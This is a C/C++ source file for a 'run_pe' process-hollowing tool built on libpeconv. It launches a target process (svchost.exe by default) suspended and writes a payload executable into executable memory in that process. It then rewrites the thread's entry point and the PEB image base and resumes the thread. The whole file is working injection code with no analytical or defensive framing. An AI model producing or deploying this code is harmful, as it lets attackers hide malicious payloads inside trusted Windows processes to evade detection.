#include <stdio.h>
#include "peconv.h"
#include "file_helper.h"

#include "ntddk.h"

bool create_new_process(IN LPSTR path, OUT PROCESS_INFORMATION &pi)
{
    STARTUPINFO si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    memset(&pi, 0, sizeof(PROCESS_INFORMATION));

    if (!CreateProcessA(
            NULL,
            path,
            NULL, //lpProcessAttributes
            NULL, //lpThreadAttributes
            FALSE, //bInheritHandles
            CREATE_SUSPENDED, //dwCreationFlags
            NULL, //lpEnvironment 
            NULL, //lpCurrentDirectory
            &si, //lpStartupInfo
            &pi //lpProcessInformation
        ))
    {
        printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
        return false;
    }
    return true;
}

bool get_calc_path(LPSTR lpOutPath, DWORD szOutPath)
{
    ExpandEnvironmentStringsA("%SystemRoot%\\system32\\svchost.exe", lpOutPath, szOutPath);
    printf("%s\n", lpOutPath );
    return true;
}

void print_context(CONTEXT &context)
{
#if defined(_WIN64)
    printf("Rcx = %p\n", context.Rcx);
    printf("Rdx = %p\n", context.Rdx);
#else
    printf("Eax = %p\n", context.Eax);
    printf("Ebx = %p\n", context.Ebx);
#endif
}

bool get_remote_context(PROCESS_INFORMATION &pi, CONTEXT &context)
{
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    return GetThreadContext(pi.hThread, &context);
}

bool update_peb_entry_point(PROCESS_INFORMATION &pi, CONTEXT &context, DWORD entry_point_va)
{
#if defined(_WIN64)
    context.Rcx = entry_point_va;
#else
    context.Eax = entry_point_va;
#endif
    if (SetThreadContext(pi.hThread, &context)) {
        return true;
    }
    DWORD last_err = GetLastError();
    printf("last err: %d %x\n", last_err, last_err);
    return false;
}

ULONGLONG get_remote_peb_addr(const CONTEXT &context)
{
    ULONGLONG PEB_addr = 0;
#if defined(_WIN64)
    PEB_addr = context.Rdx;
#else
    PEB_addr = context.Ebx;
#endif
    return PEB_addr;
}

bool read_remote_mem(HANDLE hProcess, ULONGLONG remote_addr, OUT void* buffer, const size_t buffer_size)
{
    memset(buffer, 0, buffer_size);
    if (!ReadProcessMemory(hProcess, LPVOID(remote_addr), buffer, buffer_size, NULL)) {
        printf("[ERROR] Cannot read from PEB - incompatibile target!\n");
        return false;
    }
    return true;
}

bool is_compatible_payload(BYTE* loaded_pe)
{
#if defined(_WIN64)
     if (is64bit(loaded_pe)) return true;
     return false;
#else
     if (is64bit(loaded_pe)) return false;
     return true;
#endif
}

bool redirect_to_payload(BYTE* loaded_pe, PROCESS_INFORMATION &pi, CONTEXT &context)
{
    ULONGLONG image_base = get_image_base(loaded_pe);
    DWORD ep = get_entry_point_rva(loaded_pe);
    ULONGLONG ep_va = image_base + ep;
    if (!update_peb_entry_point(pi, context, ep_va)) {
        printf("Cannot update PEB!\n");
        return false;
    }
    ULONGLONG peb_addr = get_remote_peb_addr(context);
    PEB* remote_peb = (PEB*) peb_addr;
    LPVOID remote_img_base = &(remote_peb->ImageBaseAddress);

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remote_img_base, 
        &image_base, sizeof(LPVOID), 
        &written)) 
    {
        printf("Cannot update ImageBaseAddress!\n");
        return false;
    }
    return true;
}

int main(int argc, char *argv[])
{
    char* version = "0.1";
    char* payload_path = NULL;

    char calc_path[MAX_PATH] = { 0 };
    get_calc_path(calc_path, MAX_PATH);
    char *target_path = calc_path;

    ULONGLONG loadBase = 0;
    if (argc < 2) {
        printf("[ run_pe v%s ]\n\n", version);
        printf("Args: <payload_path> [*target_path]\n");
        printf("* - optional\n");
        system("pause");
        return -1;
    }
    payload_path = argv[1];
    if (argc > 2) {
        target_path = argv[2];
    }
    printf("Target: %s\n", target_path );
    printf("Payload: %s\n", payload_path );

    size_t payloadImageSize = 0;
    // Load the current executable from the file with the help of libpeconv:
    BYTE* loaded_pe = load_pe_module(payload_path, payloadImageSize);
    if (!loaded_pe) {
        printf("Loading failed!\n");
        return -1;
    }

    PROCESS_INFORMATION pi = { 0 };
    bool is_created = create_new_process(target_path, pi);
    if (!is_created) {
        printf("Creating target process failed!\n");
        return -1;
    }
    CONTEXT context = { 0 };
    if (!get_remote_context(pi, context)) {
        printf("Getting remote context failed!\n");
        return -1;
    }
    ULONGLONG remote_peb_addr = get_remote_peb_addr(context);
    PEB peb = { 0 };
    if (remote_peb_addr) {
        if (!read_remote_mem(pi.hProcess, remote_peb_addr, &peb, sizeof(PEB))) {
            printf("Failed reading remote PEB!\n");
            return -1;
        }
    }

    printf("targetImageBase = %x\n", peb.ImageBaseAddress);
    BYTE buffer[MAX_HEADER_SIZE] = { 0 };

    if (!read_remote_mem(pi.hProcess, (ULONGLONG)peb.ImageBaseAddress, buffer, 3)) {
        printf("Failed reading remote memory!\n");
        return -1;
    }
    printf("Buffer: %s : %02x %02x\n", buffer, buffer[0], buffer[1]);

    //try to allocate space that will be the most suitable for the payload:
    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return -1;
    }
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteAddress, static_cast<ULONG>(payloadImageSize));
    
    bool is_ok = relocate_module(loaded_pe, payloadImageSize, (ULONGLONG) remoteAddress);
    if (!is_ok) {
        printf("Could not relocate the module!\n");
    }
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, loaded_pe, payloadImageSize, &written)) {
        return -1;
    }
    printf("Loaded at: %p\n", loaded_pe);

    if (redirect_to_payload(loaded_pe, pi, context)) {
        printf("Redirected!\n");
    } else {
        printf("Redirecting failed!\n");
        return -1;
    }
    ResumeThread(pi.hThread);

    system("pause");
    return 0;
}
